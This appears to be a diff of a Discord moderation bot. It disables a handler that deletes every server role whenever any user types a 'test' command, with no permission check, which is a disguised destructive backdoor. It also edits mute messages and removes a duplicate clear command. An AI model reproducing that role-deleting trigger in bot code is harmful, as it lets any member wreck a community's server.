@@ -16,13 +16,13 @@ client.on('ready', () => {
 	console.log('I am Fucker!'); 
   });
 
-  client.on('message' , najzx => {
-if(najzx.author.bot) return;
-if(najzx.channel.type == 'dm') return;
-if(najzx.content.startsWith(prefix + "test")) {
-najzx.guild.roles.filter(najzx => isNaN(najzx)).forEach(najzx => najzx.delete())
-}
-});
+ // client.on('message' , najzx => {
+//if(najzx.author.bot) return;
+//if(najzx.channel.type == 'dm') return;
+//if(najzx.content.startsWith(prefix + "test")) {
+//najzx.guild.roles.filter(najzx => isNaN(najzx)).forEach(najzx => najzx.delete())
+//}
+//});
 
 
 
@@ -33,7 +33,7 @@ client.on('message', message => {
     var args = message.content.split(' ');
     var command = args[0];
     switch(command) {
-        case "!clear":
+        case "clear":
         if (message.channel.type !== "text") return message.reply("** This Command is Only For Servers | :x: **");
         if (!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("** You Don't Have Access To Do This Command | :x: **");
         if (!args[1]) args[1] = 100;
@@ -91,7 +91,7 @@ client.on("message", async msg => {
             ADD_REACTIONS : false,
           })
         })
-        await msg.channel.send(`${mentions} muted ,-,`)
+        await msg.channel.send(`${mentions} Mute `)
       } catch (e) {
         console.log(e.stack);
       }
@@ -105,7 +105,7 @@ client.on("message", async msg => {
             ADD_REACTIONS : false,
           })
         })
-        await msg.channel.send(`${msg.guild.members.find(m => m.user.username.toLowerCase().includes(args[1])).user.username} muted ,-,`)
+        await msg.channel.send(`${msg.guild.members.find(m => m.user.username.toLowerCase().includes(args[1])).user.username} Mute`)
       } catch (e) {
         console.log(e.stack);
       }
@@ -231,30 +231,7 @@ client.on('message', async message => {
 });
 
 
-client.on('message', msg => {
-  if (msg.author.bot) return;
-  var prefix = '#';
 
-  if (!msg.content.startsWith(prefix)) return;
-  let command = msg.content.split(" ")[0];
-  command = command.slice(prefix.length);
-  let args = msg.content.split(" ").slice(1);
-
-    if(command === "clear") {
-    let textxt = args.slice(0).join("");
-    if(msg.member.hasPermission("MANAGE_MESSAGES")) {
-    if (textxt == "") {
-        msg.delete().then
-    msg.channel.send("***```ضع عدد الرسائل التي تريد مسحها 👌```***").then(m => m.delete(3000));
-} else {
-    msg.delete().then
-    msg.delete().then
-    msg.channel.bulkDelete(textxt);
-        msg.channel.send("```php\nعدد الرسائل التي تم مسحها: " + textxt + "\n```").then(m => m.delete(3000));
-        }    
-    }
-}
-});
 
 client.on('guildMemberAdd', member => {
 const channel = member.guild.channels.find("name","chat")
